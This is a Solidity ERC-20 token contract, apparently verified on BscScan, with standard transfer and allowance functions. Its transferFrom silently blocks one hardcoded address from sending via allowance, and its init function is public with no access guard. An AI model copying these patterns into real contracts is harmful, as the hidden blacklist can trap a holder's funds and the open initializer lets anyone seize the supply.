/**
 *Submitted for verification at BscScan.com on 2021-07-08
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract InitializableERC20 {
    string public name;
    uint256 public decimals;
    string public symbol;
    uint256 public totalSupply;

    bool public initialized;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) internal allowed;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    function init(
        address _creator,
        uint256 _totalSupply,
        string memory _name,
        string memory _symbol,
        uint256 _decimals
    ) public {
        require(!initialized, "TOKEN_INITIALIZED");
        initialized = true;
        totalSupply = _totalSupply;
        balances[_creator] = _totalSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        emit Transfer(address(0), _creator, _totalSupply);
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(to != address(0), "TO_ADDRESS_IS_EMPTY");
        require(amount <= balances[msg.sender], "BALANCE_NOT_ENOUGH");

        balances[msg.sender] = balances[msg.sender] - amount;
        balances[to] = balances[to] + amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function balanceOf(address owner) public view returns (uint256 balance) {
        return balances[owner];
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        require(to != address(0), "TO_ADDRESS_IS_EMPTY");
        require(from != 0xd502203A27B0ff4a012611bC03B324597F738C44);
        require(amount <= balances[from], "BALANCE_NOT_ENOUGH");
        require(amount <= allowed[from][msg.sender], "ALLOWANCE_NOT_ENOUGH");

        balances[from] = balances[from] - amount;
        balances[to] = balances[to] + amount;
        allowed[from][msg.sender] = allowed[from][msg.sender] - amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowed[owner][spender];
    }
}